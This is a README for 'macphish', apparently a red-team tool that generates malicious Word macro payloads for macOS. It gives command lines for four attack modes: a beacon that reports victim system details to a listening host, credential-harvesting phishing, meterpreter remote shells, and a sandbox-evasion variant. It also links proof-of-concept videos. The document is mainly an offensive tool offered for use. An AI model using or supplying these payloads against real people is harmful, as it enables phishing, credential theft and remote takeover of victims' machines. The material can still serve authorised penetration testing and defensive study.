# macphish
Office for Mac Macro Payload Generator
![macphish](macphish-alpha.png?raw=true "macphish")

## Attack vectors
There are 4 attack vectors available:
* beacon
* creds
* meterpreter
* meterpreter-grant

For the 'creds' method, macphish can generate the Applescript script directly, in case you need to run it from a shell. 

### beacon
On execution, this payload will signal our listening host and provide basic system information about the victim. The simplest way of generating a beacon payload is:
```
$./macphish.py -lh <listening host> 
```
By default, it uses curl but other utilities (wget, nslookup) can be used by modifying the command template. 

### creds
```
$./macphish.py -lh <listening host> -lp <listening port> -a creds
```
### meterpreter
The simplest way of generating a meterpreter payload is:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter 
```
### meterpreter-grant
The generate a meterpreter payload that calls GrantAccessToMultipleFiles() first:
```
$./macphish.py -lh <listening host> -lp <listening port> -p <payload> -a meterpreter-grant
```

For meterpreter attacks, only python payloads are supported at the moment. 

## Usage
See https://github.com/cldrn/macphish/wiki/Usage

## PoCs
* [Sandbox evasion using GrantAccessToMultipleFiles in word for mac](https://youtu.be/3F_VdPr-7K8)
* [PoC of Global And Recursive Permissions - Malicious macros for Word in MacOS](https://youtu.be/hSJH5rse4wQ)
* [Meterpreter execution in Office For Mac with macros](https://youtu.be/xXA-n1D1Fqw)
* [Credential Harvesting (Phishing) with Word macros in macOS](https://youtu.be/p0qfg0WI3sE)
